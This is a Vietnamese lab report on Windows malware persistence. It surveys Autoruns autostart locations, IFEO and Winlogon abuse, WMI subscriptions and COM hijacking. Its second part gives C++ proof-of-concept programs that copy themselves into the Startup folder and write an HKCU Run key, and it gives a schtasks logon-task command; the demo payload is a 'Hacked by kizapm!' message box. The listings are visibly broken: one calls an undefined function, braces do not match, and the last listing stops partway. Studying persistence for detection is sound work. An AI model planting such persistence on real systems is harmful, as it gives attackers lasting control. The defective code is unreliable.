
# BÁO CÁO KỸ THUẬT: PHÂN TÍCH VÀ XÂY DỰNG CƠ CHẾ PERSISTENCE TRÊN HỆ ĐIỀU HÀNH WINDOWS

# PHẦN 1: LÝ THUYẾT NỀN TẢNG 

## 1.1. Tổng quan về Persistence trong Mã độc 
### 1.1.1. Định nghĩa Persistence
Trong lĩnh vực an toàn thông tin và phân tích mã độc, **Persistence (Kỹ thuật duy trì sự hiện diện)** là tập hợp các phương thức, cơ chế và thủ thuật được kẻ tấn công sử dụng nhằm đảm bảo mã độc có thể **tự động khởi động lại và tiếp tục hoạt động** sau khi hệ thống gặp các biến cố gián đoạn như:
- Khởi động lại hệ điều hành (System Reboot).
- Người dùng đăng xuất phiên làm việc (User Logoff).
- Tiến trình của mã độc bị phát hiện và kết thúc đột ngột (Process Termination/Crash).
- Kết nối mạng điều khiển (C2 Session) bị ngắt quãng.

### 1.1.2. Vai trò trong vòng đời tấn công (MITRE ATT&CK TA0003)
Theo khung ma trận **MITRE ATT&CK Enterprise Matrix**, Persistence là một chiến thuật trọng yếu mang mã định danh **TA0003**. 

Sau khi vượt qua giai đoạn xâm nhập ban đầu (*Initial Access - TA0001*) và thực thi thành công mã độc (*Execution - TA0002*), nếu không thiết lập Persistence, mọi quyền truy cập của kẻ tấn công sẽ biến mất hoàn toàn ngay khi nạn nhân tắt máy hoặc đăng xuất. Do đó, thiết lập cơ chế tồn tại bền bỉ là "bàn đạp sống còn" để kẻ tấn công tiếp tục thực hiện:
- Nâng cao đặc quyền (*Privilege Escalation - TA0004*).
- Lẩn tránh sự giám sát (*Defense Evasion - TA0005*).
- Thu thập thông tin nhạy cảm và di chuyển ngang (*Credential Access & Lateral Movement*).

### 1.1.3. Mục tiêu chiến lược của kẻ tấn công
1. **Duy trì quyền kiểm soát liên tục (Continuous Control):** Luôn có backdoor sẵn sàng nhận lệnh từ máy chủ C2.
2. **Ẩn mình tối đa (Stealth & Low Profile):** Tận dụng các cơ chế khởi động hợp pháp của hệ điều hành để tránh bị phát hiện bởi người dùng thông thường và phần mềm bảo mật (EDR/AV).
3. **Dự phòng đa lớp (Redundant Persistence):** Nhiều họ mã độc APT (như Cozy Bear, Lazarus, Emotet) thường cài đặt đồng thời từ 2 đến 3 cơ chế persistence độc lập (ví dụ: vừa ghi Registry Run key, vừa tạo Scheduled Task dự phòng).

---

## 1.2. Nghiên cứu 12 Nhóm Autostart Entry trong Sysinternals Autoruns (24đ)

Công cụ **Sysinternals Autoruns** do Microsoft phát triển là giải pháp tiêu chuẩn toàn cầu để kiểm tra toàn diện các điểm khởi động tự động (ASEP - Auto-Start Extensibility Points) trên Windows. Dưới đây là phân tích chi tiết 12 nhóm Autostart trọng yếu:

---

### 1.2.1. Nhóm 1: Logon
- **Mô tả chức năng:**
  Nhóm này chứa các điểm khởi động được hệ điều hành Windows kích hoạt tự động mỗi khi có người dùng đăng nhập thành công vào phiên làm việc (Interactive Logon). Đây là nhóm autostart phổ biến nhất, trực quan nhất và thường được cấu hình cho các ứng dụng thông thường.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Thư mục Startup của người dùng: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
  - Thư mục Startup của toàn hệ thống: `%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup`
  - Registry Run (Người dùng hiện tại): `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
  - Registry Run (Toàn hệ thống): `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
  - Registry RunOnce: `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce` và `HKCU\...\RunOnce`
  - Active Setup: `HKLM\Software\Microsoft\Active Setup\Installed Components`
- **Phương thức mã độc lợi dụng:**
  - Ghi đường dẫn trực tiếp của tệp thực thi độc hại vào khóa `Run` hoặc `RunOnce` dưới tên ngụy trang giống ứng dụng hệ thống (ví dụ: `WindowsUpdate`, `OneDriveSync`, `RealtekAudio`).
  - Copy tệp mã độc hoặc tệp shortcut (`.lnk`) vào thư mục `Startup`.
  - Sử dụng khóa `RunOnce` để nạp tệp cài đặt phụ rồi tự động ghi lại chính nó trước khi tiến trình kết thúc.

---

### 1.2.2. Nhóm 2: Explorer
- **Mô tả chức năng:**
  Quản lý các mô-đun mở rộng (Shell Extensions, Shell Icon Overlays, Context Menu Handlers) tích hợp trực tiếp vào tiến trình giao diện người dùng chính của Windows là `explorer.exe`. Khi `explorer.exe` khởi chạy hoặc khi người dùng tương tác với tệp tin/thư mục, hệ thống sẽ nạp các DLL mở rộng này vào không gian bộ nhớ.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Shell Folders / User Shell Folders: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
  - Shell Execute Hooks: `HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellExecuteHooks`
  - Shell Extensions Approved: `HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved`
  - Shell Icon Overlay Identifiers: `HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers`
- **Phương thức mã độc lợi dụng:**
  - Đăng ký một Shell Extension độc hại dạng DLL. Khi người dùng mở File Explorer hoặc nhấp chuột phải vào bất kỳ tệp nào, DLL độc hại sẽ được nạp trực tiếp vào tiến trình `explorer.exe` hợp pháp.
  - Sửa đổi đường dẫn `User Shell Folders` trỏ các thư mục mặc định như `Desktop` hoặc `Documents` về thư mục chứa payload của mã độc.

---

### 1.2.3. Nhóm 3: Internet Explorer / Browser Helper Objects (BHO)
- **Mô tả chức năng:**
  Quản lý các plugin, thanh công cụ (toolbars) và các đối tượng hỗ trợ trình duyệt (BHO - Browser Helper Objects) được thiết kế cho Internet Explorer hoặc các thành phần nhúng WebBrowser Control (thường được dùng bởi nhiều ứng dụng nội bộ Windows).
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Khóa BHO chính: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
  - URL Search Hooks: `HKLM\SOFTWARE\Microsoft\Internet Explorer\URLSearchHooks`
  - IE Extensions: `HKLM\SOFTWARE\Microsoft\Internet Explorer\Extensions`
- **Phương thức mã độc lợi dụng:**
  - Các phần mềm quảng cáo độc hại (Adware), phần mềm gián điệp (Spyware) và Banking Trojan (như Zeus, Gozi) đăng ký BHO dưới dạng DLL.
  - Khi trình duyệt hoặc bất kỳ tiến trình nào khởi tạo đối tượng duyệt web, BHO DLL sẽ được nạp để thực hiện hành vi Form Grabbing, đánh cắp mật khẩu, chặn bắt gói tin HTTP/HTTPS hoặc tiêm mã JavaScript độc hại (Man-in-the-Browser).

---

### 1.2.4. Nhóm 4: Scheduled Tasks
- **Mô tả chức năng:**
  Cơ chế lập lịch tác vụ tự động của Windows (Task Scheduler Engine), cho phép cấu hình khởi chạy các chương trình hoặc kịch bản lệnh theo các điều kiện linh hoạt: thời gian cố định, chu kỳ lặp lại, khi khởi động hệ thống (At startup), khi đăng nhập (At logon), hoặc khi xảy ra một sự kiện cụ thể trong Windows Event Log.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Tệp định nghĩa tác vụ (XML format): `C:\Windows\System32\Tasks\`
  - Khóa Registry cấu hình Task: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks`
  - Khóa ánh xạ Tree: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree`
- **Phương thức mã độc lợi dụng:**
  - Tạo một Scheduled Task mới thông qua tiện ích dòng lệnh `schtasks.exe` hoặc trực tiếp qua Win32 COM API (`ITaskService`).
  - Cấu hình tác vụ chạy với quyền hệ thống cao nhất (`SYSTEM` / Run with highest privileges) để vừa đạt được Persistence, vừa leo thang đặc quyền.
  - Đặt tên tác vụ trùng hoặc tương tự với các tác vụ bảo trì hệ thống của Microsoft (ví dụ: `\Microsoft\Windows\Defrag\ScheduledDefragUpdate`).

---

### 1.2.5. Nhóm 5: Services
- **Mô tả chức năng:**
  Dịch vụ hệ thống (Windows Services) là các tiến trình chạy ngầm nền độc lập với phiên đăng nhập của người dùng. Dịch vụ được khởi chạy rất sớm ngay trong quá trình boot hệ thống bởi tiến trình `services.exe` (Service Control Manager - SCM) và thường sở hữu đặc quyền tối cao (`NT AUTHORITY\SYSTEM` hoặc `LocalService`).
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Registry định nghĩa Services: `HKLM\SYSTEM\CurrentControlSet\Services\<Tên_Dịch_Vụ>`
  - Giá trị `ImagePath`: Trỏ tới tệp thực thi (`.exe`) hoặc `svchost.exe -k <ServiceGroup>`.
  - Giá trị `ServiceDll`: Nằm trong subkey `Parameters\ServiceDll` nếu chạy dưới dạng dịch vụ chia sẻ `svchost.exe`.
  - Giá trị `Start`: Quy định chế độ khởi động (2 = Automatic, 3 = Manual, 4 = Disabled).
- **Phương thức mã độc lợi dụng:**
  - Sử dụng API `CreateServiceA` hoặc lệnh `sc.exe create` để tạo một Service mới chạy mã độc với quyền SYSTEM.
  - Sửa đổi giá trị `ImagePath` của các dịch vụ hệ thống ít hoạt động hoặc đã bị vô hiệu hóa (Service Hijacking).
  - Đăng ký payload dưới dạng DLL và đính kèm vào nhóm dịch vụ `svchost.exe` để ngụy trang hoàn hảo thành tiến trình hệ sinh thái lõi của Windows.

---

### 1.2.6. Nhóm 6: Drivers
- **Mô tả chức năng:**
  Trình điều khiển thiết bị (Kernel-Mode Drivers) hoạt động ở tầng nhân hệ điều hành (Ring 0). Drivers có toàn quyền can thiệp vào bộ nhớ vật lý, phần cứng, luồng thực thi CPU và kiểm soát toàn bộ các tiến trình người dùng (Ring 3).
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Tệp nhị phân driver: `C:\Windows\System32\drivers\*.sys`
  - Registry cấu hình: `HKLM\SYSTEM\CurrentControlSet\Services\<Driver_Name>` với giá trị `Type = 1` (Kernel Driver) hoặc `Type = 2` (File System Driver).
  - Chế độ khởi động: `Start = 0` (Boot Start - nạp bởi OS loader), `Start = 1` (System Start - nạp trong pha khởi tạo kernel).
- **Phương thức mã độc lợi dụng:**
  - Mã độc Rootkit cài đặt driver nhân độc hại để ẩn giấu hoàn toàn tiến trình, tệp tin, cổng mạng và khóa Registry (Rootkit Hooking / SSDT Hooking).
  - Vượt qua cơ chế kiểm tra chữ ký số Driver Signature Enforcement (DSE) bằng cách sử dụng chứng chỉ số bị đánh cắp hoặc khai thác kỹ thuật **BYOVD (Bring Your Own Vulnerable Driver)**: Nạp một driver hợp pháp có lỗ hổng đã biết để vô hiệu hóa EDR/AV từ Ring 0.

---

### 1.2.7. Nhóm 7: AppInit DLLs
- **Mô tả chức năng:**
  Cơ chế cho phép chỉ định danh sách các thư viện liên kết động (DLL) được nạp tự động vào không gian địa chỉ bộ nhớ của **mọi tiến trình người dùng** tải thư viện `user32.dll`. Đây vốn là cơ chế hỗ trợ debugging và quản lý đồ họa của Windows NT cũ.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Hệ thống 32-bit & 64-bit: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`
  - Khóa dành cho ứng dụng 32-bit trên OS 64-bit (WoW64): `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows`
  - Các giá trị:
    - `AppInit_DLLs`: Chuỗi chứa đường dẫn đến tệp DLL cần nạp.
    - `LoadAppInit_DLLs`: Giá trị DWORD (`1` = Bật, `0` = Tắt).
- **Phương thức mã độc lợi dụng:**
  - Ghi đường dẫn DLL độc hại vào `AppInit_DLLs` và bật `LoadAppInit_DLLs = 1`.
  - Mỗi khi bất kỳ ứng dụng đồ họa nào (GUI Process) như `notepad.exe`, `calc.exe`, trình duyệt khởi chạy, DLL độc hại sẽ lập tức được thực thi trong ngữ cảnh tiến trình đó (Process Injection thụ động kết hợp Persistence).
  - *Lưu ý hiện đại:* Kể từ Windows 8/10, tính năng Secure Boot đã mặc định vô hiệu hóa AppInit DLLs trừ khi tệp DLL được ký số hợp lệ.

---

### 1.2.8. Nhóm 8: Image Hijacks (Image File Execution Options - IFEO)
- **Mô tả chức năng:**
  Tính năng IFEO được Microsoft thiết kế dành cho lập trình viên để gắn trình gỡ lỗi (Debugger) vào một tệp thực thi cụ thể. Khi tệp thực thi mục tiêu được gọi, hệ điều hành sẽ tự động chuyển hướng và khởi chạy ứng dụng được cấu hình trong khóa `Debugger` thay thế.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<Target_Executable_Name>`
  - Giá trị chuỗi: `Debugger = "C:\Path\To\Debugger.exe"`
  - Tính năng mở rộng: `GlobalFlag` kết hợp `SilentProcessExit` (kích hoạt payload khi tiến trình mục tiêu tắt đi).
- **Phương thức mã độc lợi dụng:**
  - **Accessibility Hijack:** Gán debugger cho các ứng dụng trợ năng chạy trước màn hình đăng nhập như `sethc.exe` (Sticky Keys), `utilman.exe`, `osk.exe` trỏ về `cmd.exe`.
  - **AV/EDR Blocking:** Gán debugger cho các tệp thực thi của phần mềm diệt virus (ví dụ: `MsMpEng.exe`, `mbam.exe`) trỏ về `systray.exe` hoặc một ứng dụng rỗng, khiến phần mềm bảo vệ không thể khởi chạy.

---

### 1.2.9. Nhóm 9: Winlogon
- **Mô tả chức năng:**
  Quản lý tiến trình `winlogon.exe` - thành phần chịu trách nhiệm xử lý việc đăng nhập, xác thực danh tính người dùng và nạp giao diện màn hình nền (Desktop environment).
- **Vị trí Registry / Đường dẫn hệ thống:**
  - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
  - Khóa `Shell`: Mặc định là `explorer.exe`.
  - Khóa `Userinit`: Mặc định là `C:\Windows\system32\userinit.exe,`.
  - Khóa `Notify`: Đăng ký DLL nhận thông báo về sự kiện đăng nhập/đăng xuất.
- **Phương thức mã độc lợi dụng:**
  - Nối đường dẫn mã độc vào sau khóa `Userinit` (ví dụ: `C:\Windows\system32\userinit.exe, C:\malware.exe`). Cả hai tệp đều được kích hoạt khi người dùng đăng nhập.
  - Thay thế hoặc đính kèm vào khóa `Shell` để mã độc được chạy trước hoặc song song với giao diện người dùng.
  - Tấn công GINA (Graphical Identification and Authentication) trên các phiên bản Windows cũ để đánh cắp mật khẩu đăng nhập dạng văn bản thô.

---

### 1.2.10. Nhóm 10: Office Add-ins
- **Mô tả chức năng:**
  Quản lý các phần bổ trợ (Add-ins), mẫu định dạng tự động (Templates), macro mở rộng được bộ ứng dụng Microsoft Office (Word, Excel, Outlook, PowerPoint) tự động nạp mỗi khi ứng dụng khởi chạy.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - COM Add-ins: `HKCU\Software\Microsoft\Office\<Ứng_dụng>\Addins\<Addin_Name>`
  - Word Startup Folder: `%APPDATA%\Microsoft\Word\STARTUP\`
  - Excel XLSTART Folder: `%APPDATA%\Microsoft\Excel\XLSTART\`
  - WLL / XLL files (C/C++ Add-in DLLs).
- **Phương thức mã độc lợi dụng:**
  - Đặt tệp mẫu chứa macro độc hại (`Normal.dotm`) vào thư mục Startup của Word hoặc tệp nhị phân `.xll` vào thư mục khởi động của Excel.
  - Đăng ký COM Add-in cho `OUTLOOK.EXE` để mã độc luôn chạy ngầm bất cứ khi nào người dùng kiểm tra email, đồng thời có thể đánh cắp danh bạ hoặc gửi email phishing nội bộ.

---

### 1.2.11. Nhóm 11: KnownDLLs
- **Mô tả chức năng:**
  Cơ chế tối ưu hóa hiệu năng hệ thống của Windows NT. Thư mục đối tượng `\KnownDlls` trong Object Manager chứa danh sách các DLL hệ thống lõi thường dùng (như `kernel32.dll`, `user32.dll`, `shell32.dll`) đã được nạp sẵn vào bộ nhớ để các tiến trình nạp nhanh chóng mà không cần tìm kiếm trên đĩa.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Khóa định nghĩa danh sách: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`
  - Đối tượng trong Windows Object Directory: `\KnownDlls` (kiểm tra bằng công cụ WinObj).
- **Phương thức mã độc lợi dụng:**
  - Bình thường, KnownDLLs giúp phòng chống tấn công DLL Search Order Hijacking. Tuy nhiên, nếu mã độc đã có quyền quản trị (Administrator/SYSTEM), nó có thể chỉnh sửa khóa Registry này:
    - Loại bỏ một DLL khỏi danh sách để kích hoạt kỹ thuật DLL Sideloading đối với các ứng dụng hệ thống.
    - Thêm một DLL tùy chỉnh trỏ về thư mục chứa payload của mã độc để ép buộc toàn bộ các ứng dụng Windows nạp DLL đó.

---

### 1.2.12. Nhóm 12: WMI (Windows Management Instrumentation)
- **Mô tả chức năng:**
  WMI là hạ tầng quản trị mạnh mẽ của Windows. Cơ chế **WMI Event Subscription** cho phép thực thi một hành động tùy chọn khi một sự kiện hệ điều hành nhất định được thỏa mãn mà hoàn toàn không cần tiến trình nào chạy nền thường trực.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Cơ sở dữ liệu WMI: `C:\Windows\System32\wbem\Repository\`
  - Namespace mặc định: `root\subscription`
  - Ba thành phần cốt lõi:
    1. `__EventFilter`: Biểu thức WQL (WMI Query Language) lắng nghe sự kiện (ví dụ: kích hoạt 2 phút sau khi hệ thống khởi động: `SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120`).
    2. `CommandLineEventConsumer` hoặc `ActiveScriptEventConsumer`: Đối tượng định nghĩa hành động thực thi (lệnh chạy file, chạy VBScript/PowerShell).
    3. `__FilterToConsumerBinding`: Đối tượng liên kết giữa Filter và Consumer.
- **Phương thức mã độc lợi dụng:**
  - Đây là kỹ thuật persistence không dùng tệp (Fileless Persistence) rất cao cấp (được dùng bởi malware NotPetya, Stuxnet, Flame).
  - Không tạo khóa Registry thông thường, không tạo file trong thư mục Startup, rất khó bị phát hiện bởi người dùng nếu không kiểm tra bằng các công cụ chuyên dụng như `autoruns.exe` (tab WMI) hoặc PowerShell cmdlet `Get-CimInstance`.

---

### 1.2.13. Bảng tổng hợp đối chiếu 12 nhóm Autostart

| Nhóm Entry (Autoruns) | Vị trí lưu trữ chính | Đặc quyền yêu cầu | Mức độ ẩn nặc | Mức độ phổ biến của Malware |
| :--- | :--- | :--- | :--- | :--- |
| **Logon** | `HKCU/HKLM...\Run`, Thư mục Startup | User / Admin | Thấp | Rất cao (phổ thông nhất) |
| **Explorer** | `HKLM...\Shell Extensions`, `User Shell Folders` | User / Admin | Trung bình | Trung bình |
| **Browser (BHO)** | `HKLM...\Browser Helper Objects` | Admin | Trung bình | Cao (Trojan, Adware) |
| **Scheduled Tasks** | `C:\Windows\System32\Tasks`, TaskCache | User / Admin | Trung bình | Rất cao |
| **Services** | `HKLM\SYSTEM\...\Services` | Admin / SYSTEM | Cao | Rất cao (Ransomware, APT) |
| **Drivers** | `C:\Windows\System32\drivers`, `Services` (Type=1) | Kernel Admin | Cực cao | Thấp (Rootkit cao cấp) |
| **AppInit DLLs** | `HKLM\...\Windows\AppInit_DLLs` | Admin | Cao | Thấp (do Secure Boot hạn chế) |
| **Image Hijacks** | `HKLM\...\Image File Execution Options` | Admin | Cao | Cao |
| **Winlogon** | `HKLM\...\Winlogon` (`Userinit`, `Shell`) | Admin | Cao | Trung bình |
| **Office Add-ins** | `%APPDATA%\Microsoft\Office\Addins`, `STARTUP` | User | Cao | Cao (Tấn công nhắm mục tiêu) |
| **KnownDLLs** | `HKLM\...\Session Manager\KnownDLLs` | SYSTEM | Cực cao | Rất thấp (APT đặc biệt) |
| **WMI** | WMI Repository (`root\subscription`) | Admin | Cực cao | Cao (Fileless malware) |

---

## 1.3. Kỹ thuật Persistence Nâng cao: COM Hijacking (5đ)

### 1.3.1. Khái niệm COM (Component Object Model)
**Component Object Model (COM)** là một kiến trúc hướng đối tượng chuẩn nhị phân độc lập ngôn ngữ do Microsoft phát triển từ năm 1993. COM cho phép các đối tượng phần mềm tương tác và giao tiếp với nhau xuyên suốt qua các ranh giới tiến trình (Inter-Process Communication - IPC) hoặc trong cùng một tiến trình dưới dạng In-Process Server (DLL). Hầu như toàn bộ các tác vụ giao diện, xử lý đồ họa, tự động hóa Office và tác vụ nền của Windows đều dựa trên nền tảng COM.

### 1.3.2. Định danh CLSID (Class Identifier)
Để định danh duy nhất cho một lớp đối tượng COM (COM Class), hệ điều hành Windows sử dụng một mã số GUID 128-bit gọi là **CLSID (Class Identifier)**. 
- Định dạng chuẩn: `{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}` (ví dụ: `{20D04FE0-3AEA-1069-A2D8-08002B30309D}` là CLSID đại diện cho đối tượng "This PC").
- Trong Windows Registry, cấu hình của CLSID chỉ rõ tệp nhị phân chịu trách nhiệm hiện thực hóa đối tượng thông qua các khóa:
  - `InprocServer32`: Trỏ tới đường dẫn tệp DLL (nạp vào cùng tiến trình gọi).
  - `LocalServer32`: Trỏ tới đường dẫn tệp EXE độc lập.

### 1.3.3. Cơ chế tra cứu đối tượng COM trong Registry (HKCU vs HKLM)
Khi một ứng dụng gọi hàm Win32 API như `CoCreateInstance()` hoặc `CoGetClassObject()` với một CLSID cụ thể, hệ điều hành sẽ tiến hành tra cứu đường dẫn nhị phân trong Registry theo cơ chế kết hợp **Registry Redirection / Virtualization**:

```
Ưu tiên số 1 (User-level):
HKCU\Software\Classes\CLSID\{CLSID-GUID}\InprocServer32
               │
               ├─► [Tìm thấy] ────► NẠP DLL NÀY NGAY LẬP TỨC (Dừng tra cứu)
               │
               └─► [Không tìm thấy]
                         │
                         ▼
Ưu tiên số 2 (System-level):
HKLM\Software\Classes\CLSID\{CLSID-GUID}\InprocServer32
                         │
                         ├─► [Tìm thấy] ────► Nạp DLL hệ thống mặc định
                         └─► [Không tìm thấy] ──► Báo lỗi REGDB_E_CLASSNOTREG
```

> **Nguyên tắc trọng yếu:**
> Khóa Registry của người dùng (`HKCU`) luôn được ưu tiên kiểm tra **TRƯỚC** khóa Registry của toàn hệ thống (`HKLM`). Điều này cho phép một tiến trình chạy với đặc quyền người dùng bình thường (Standard User) có thể ghi đè hành vi nạp COM của toàn bộ ứng dụng mà không hề yêu cầu đặc quyền Administrator (UAC Bypass / Privilege Independence).

### 1.3.4. Nguyên lý hoạt động của COM Hijacking
Kỹ thuật COM Hijacking (chiếm quyền điều khiển COM) hoạt động theo hai phương thức chủ yếu:

1. **Ghi đè CLSID hiện hữu (CLSID Override):**
   - Kẻ tấn công tìm một CLSID thường xuyên được gọi bởi các tiến trình hệ thống (như `explorer.exe` hoặc các Scheduled Tasks hệ thống chạy định kỳ).
   - Mã độc tạo khóa tương ứng trong `HKCU\Software\Classes\CLSID\{GUID}\InprocServer32` và trỏ giá trị mặc định về DLL độc hại của mình.
   - Khi tiến trình hệ thống kích hoạt CLSID đó, do cơ chế ưu tiên, Windows sẽ nạp DLL độc hại thay vì DLL gốc trong `HKLM`.
2. **Chiếm dụng CLSID bị bỏ trống (Missing/Abandoned CLSID Hijacking):**
   - Rất nhiều ứng dụng và tác vụ Windows cố gắng nạp các CLSID cũ không còn tồn tại trong `HKLM` (gây ra lỗi `NAME NOT FOUND` khi theo dõi bằng Process Monitor).
   - Mã độc chỉ cần đăng ký đúng CLSID đó trong `HKCU`, biến một yêu cầu lỗi thành một lần thực thi payload hoàn hảo.

### 1.3.5. Vì sao COM Hijacking cực kỳ khó bị phát hiện?
1. **Không yêu cầu quyền Admin:** Toàn bộ quá trình tạo khóa diễn ra trong phân vùng `HKCU`, không kích hoạt hộp thoại cảnh báo UAC (User Account Control).
2. **Không có khóa khởi động lộ liễu:** Không tạo các mục trong `Run`, `RunOnce` hay `Services` - những nơi mà quản trị viên và phần mềm diệt virus quét đầu tiên.
3. **Thực thi trong lòng tiến trình sạch (Living-off-the-Land):** DLL độc hại được nạp thẳng vào không gian bộ nhớ của các tiến trình hệ thống đáng tin cậy như `explorer.exe`, `taskhostw.exe`, `dllhost.exe`. Về mặt mạng và hệ thống, hành vi kết nối C2 sẽ xuất phát từ chính các tiến trình hợp pháp này.
4. **Bỏ lọt trong các công cụ quét sơ sài:** Nếu người phân tích chỉ quét `HKLM` hoặc không kiểm tra sự bất thường giữa `HKCU` và `HKLM`, COM Hijacking sẽ hoàn toàn "tàng hình".

---

# PHẦN 2:

## 2.1. Tự phát triển Mã C/C++ Tạo Persistence 

### 2.1.1. Thiết kế kiến trúc chương trình PoC
Mục tiêu là xây dựng một tệp thực thi PE 32-bit hoặc 64-bit bằng C/C++ (`persistence_demo.exe`). 
- Khi được thực thi lần đầu, chương trình sẽ tự động lấy đường dẫn tuyệt đối của chính nó thông qua hàm `GetModuleFileNameA()`.
- Sao chép bản thân vào một vị trí lưu trữ giả lập mã độc an toàn (ví dụ: thư mục `%TEMP%` hoặc `%APPDATA%`).
- Cung cấp mã nguồn thực hiện độc lập hoặc tuần tự 3 kỹ thuật:
  1. **Folder Startup** (Sao chép shortcut/file vào thư mục khởi động).
  2. **Registry Run Key** (Ghi khóa Run tại `HKCU`).
  3. **Task Schedule** (Tạo tác vụ tự động bằng lệnh hệ thống `schtasks`).
- Khi được kích hoạt sau khi hệ thống khởi động hoặc đăng nhập, payload sẽ hiển thị một hộp thoại thông báo an toàn: `MessageBoxA(NULL, "Persistence Activated Successfully!", "Lab Verification", MB_OK | MB_ICONINFORMATION)`.

### 2.1.2. Phân tích chi tiết 3 cơ chế thực hiện

#### Cơ chế 1: Thư mục Startup 
- **API sử dụng:** `SHGetFolderPathA()` với hằng số `CSIDL_STARTUP` hoặc sử dụng biến môi trường `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`.
- **Thao tác:** Sao chép tệp thực thi hiện tại vào thư mục này bằng hàm `CopyFileA()`.

#### Cơ chế 2: Registry Run Key 
- **API sử dụng:** `RegOpenKeyExA()`, `RegSetValueExA()`, `RegCloseKey()`.
- **Đường dẫn Registry:** `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.
- **Thao tác:** Tạo giá trị chuỗi (REG_SZ) với tên định danh `MalwareLabPersistenceDemo` chứa đường dẫn đầy đủ đến tệp exe.

#### Cơ chế 3: Lập lịch tác vụ Task Scheduler 
- **Phương thức:** Gọi API `CreateProcessA()` hoặc `WinExec()` thực thi tiện ích tích hợp sẵn của Windows `schtasks.exe`.
- **Cú pháp lệnh:**
  ```cmd
  schtasks /create /tn "MalwareLabPersistenceTask" /tr "\"C:\Path\To\persistence_demo.exe\"" /sc onlogon /f
  ```
- **Thao tác:** Tác vụ được thiết lập để kích hoạt tự động mỗi khi người dùng đăng nhập (`/sc onlogon`).

---

### 2.1.3. Mã nguồn C/C++ hoàn chỉnh (`persistence_demo.cpp`)
Mã nguồn đối với cơ chế 1	"Thư mục Startup"
```cpp
#include <windows.h>
#include <shlobj.h>
#include <string>

using namespace std;

bool hehe()
{
    wchar_t startup[MAX_PATH];

    // 1. Lấy đường dẫn Startup Folder
    if (FAILED(SHGetFolderPathW(
        NULL,
        CSIDL_STARTUP,
        NULL,
        0,
        startup)))
    {
        return false;
    }

    // 2. Lấy đường dẫn của chính file EXE hiện tại
    wchar_t self[MAX_PATH];

    DWORD len = GetModuleFileNameW(
        NULL,
        self,
        MAX_PATH
    );

    if (len == 0 || len >= MAX_PATH)
    {
        return false;
    }

    // 3. Tạo đường dẫn đích trong Startup Folder
    wstring destination =
        wstring(startup) +
        L"\\ConsoleApplication1.exe";

    // 4. Nếu chương trình đã chạy từ Startup Folder
    // thì không cần copy chính nó thêm lần nữa
    if (_wcsicmp(self, destination.c_str()) == 0)
    {
        return true;
    }

    // 5. Copy file vào Startup Folder
    if (!CopyFileW(
        self,
        destination.c_str(),
        FALSE))
    {
        return false;
    }

    return true;
}

int main()
{
    bool result = hehe();

    if (result)
    {
        MessageBoxW(
            NULL,
            L"Hacked by kizapm!",
            L"hehe123",
            MB_OK | MB_ICONINFORMATION
        );
    }
    else
    {
        MessageBoxW(
            NULL,
            L"failed to hacked",
            L"hehe321",
            MB_OK | MB_ICONERROR
        );
    }

    return 0;
}
}
```

***Mã nguồn đối với cơ chế Registry Run Key*** 
```
#include <windows.h>
#include <string>

using namespace std;

bool InstallRunKey()
{
    wchar_t self[MAX_PATH];

    DWORD len = GetModuleFileNameW(
        NULL,
        self,
        MAX_PATH
    );

    if (len == 0 || len >= MAX_PATH)
    {
        return false;
    }

    HKEY hKey;

    LONG status = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        NULL,
        0,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL
    );

    if (status != ERROR_SUCCESS)
    {
        return false;
    }

    status = RegSetValueExW(
        hKey,
        L"PersistenceLab",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(self),
        static_cast<DWORD>(
            (wcslen(self) + 1) * sizeof(wchar_t)
        )
    );

    RegCloseKey(hKey);

    return status == ERROR_SUCCESS;
}

int main()
{
    bool result = hehe();

    if (result)
    {
        MessageBoxW(
            NULL,
            L"Hacked by kizapm!",
            L"hehe123",
            MB_OK | MB_ICONINFORMATION
        );
    }
    else
    {
        MessageBoxW(
            NULL,
            L"failed to hacked",
            L"hehe321",
            MB_OK | MB_ICONERROR
        );
    }

    return 0;
}
}
```
***Mã nguồn đối với cơ chế - Lập lịch tác vụ Task Scheduler *** 
```
#include <windows.h>
#include <string>

using namespace std;

bool InstallTask()
{
    wchar_t self[MAX_PATH];

    DWORD len = GetModuleFileNameW(
        NULL,
        self,
        MAX_PATH
    );

    if (len == 0 || len >= MAX_PATH)
    {
        return false;
    }

